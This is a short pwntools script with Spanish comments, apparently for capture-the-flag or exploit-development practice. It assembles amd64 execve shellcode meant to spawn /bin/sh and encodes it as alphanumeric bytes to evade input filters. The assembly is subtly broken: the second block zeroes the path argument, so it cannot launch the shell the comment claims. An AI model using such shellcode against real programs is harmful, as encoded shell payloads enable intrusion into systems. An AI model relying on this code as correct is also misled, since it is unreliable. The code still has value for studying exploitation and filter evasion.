from pwn import *

# Establecer la arquitectura como amd64
context.arch = 'amd64'

# Crear el shellcode para invocar /bin/sh
#shellcode = asm(shellcraft.sh())
shellcode = asm("""
    push rsp
    pop rdi
    mov al,0x3b
    syscall
""")

shellcode = asm("""
    xor rdi, rdi
    mov rsi, rdi
    mov rdx, rdi
    mov rax, 0x3b
    syscall
""")

# Codificar el shellcode para que sea alfanumérico
encoded_shellcode = pwnlib.encoders.encoder.alphanumeric(shellcode, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789')

# Mostrar el shellcode original y el codificado
print("Shellcode original:")
print(shellcode.hex())
print("Shellcode alfanumérico:")
print(encoded_shellcode)

